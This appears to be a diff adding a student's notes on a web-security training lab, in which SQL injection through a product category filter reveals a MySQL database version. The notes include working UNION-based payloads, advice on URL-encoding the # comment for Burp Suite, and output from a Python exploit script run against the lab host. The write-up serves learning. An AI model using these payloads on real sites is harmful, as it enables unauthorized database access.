@@ -1,0 +1,38 @@
+LAB 08 - SQL injection attack, querying the database type and version on MySQL and Microsoft
+
+SQL Injection - Product category filter
+
+End Goal - Display the database version string
+
+Analysis:
+
+1. Find # of columns in product category table
+' ORDER BY 1-- // internal server error... weird. Let's try a different comment
+' ORDER BY 1# // works (in Burp Suite)... this must be MySQL because MySQL uses # as comments
+
+NOTE: Entering the sqli payload ' ORDER BY 1# seems to not work in the browser anymore...
+We need to do it in Burp Suite repeater (make sure to Ctrl+U to encode it as well...)
+See images 08-browser-payload-fail and 08-burp-repeater-success for visual explanation
+
+NOTE: Nevermind. It's because it thinks "#" is a reference to a location on the page.
+The encoded version of the symbol "#" is "%23"
+
+NOTE: The browser uses UTF-8 encoding, Burp Suite GET requests use URL encoding.
+It seems like Burp Suite accepts "#" as well too though... Read more on this later.
+
+2. Figure out which columns contain text
+' UNION SELECT 'a','a'#
+-> both columns contain text
+
+3. Output the DB version
+' UNION SELECT @@version, NULL#
+' UNION SELECT @@version, NULL%23
+
+====================================================================================================
+Python script usage and output
+                                                                                                                                                                                                   
+┌──(kali㉿kali)-[~/Downloads/SQL-Injection-Labs/lab-08]
+└─$ python3 sqli-lab-08.py "https://0a49002e0322b19d83ea2866005a0081.web-security-academy.net"
+[+] Dumping the version of the database...
+[+] Found the MySQL Database Version!
+[+] The MySQL database version is: 8.0.33-0ubuntu0.20.04.4
